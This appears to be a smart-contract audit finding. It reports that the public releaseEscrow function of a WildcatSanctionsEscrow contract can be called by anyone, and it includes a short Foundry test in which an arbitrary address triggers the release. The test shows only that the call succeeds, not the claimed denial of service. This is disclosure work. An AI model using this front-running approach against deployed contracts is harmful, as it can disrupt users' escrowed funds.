# Vulnerability details

## Impact
Attackers can prevent normal users from using it by calling the public releaseEscrow function.

## Proof of Concept
Since the releaseEscrow function is public, anyone can call this function.

Therefore, attackers could listen to the creation of the WildcatSanctionsEscrow contract and invoke the releaseEscrow function as soon as possible. This allows them to prevent other users from using the contract normally.
poc:
```
  function testCanReleaseEscrow() public {
    address borrower = address(1);
    address account = address(2);
    address asset = address(new MockERC20());
    WildcatSanctionsEscrow escrow = WildcatSanctionsEscrow(
      sentinel.createEscrow(borrower, account, asset)
    );
    assertEq(escrow.canReleaseEscrow(), true);

    address evil = makeAddr(("user1"));
    vm.prank(evil);
    escrow.releaseEscrow();
    vm.stopPrank();
  }
```
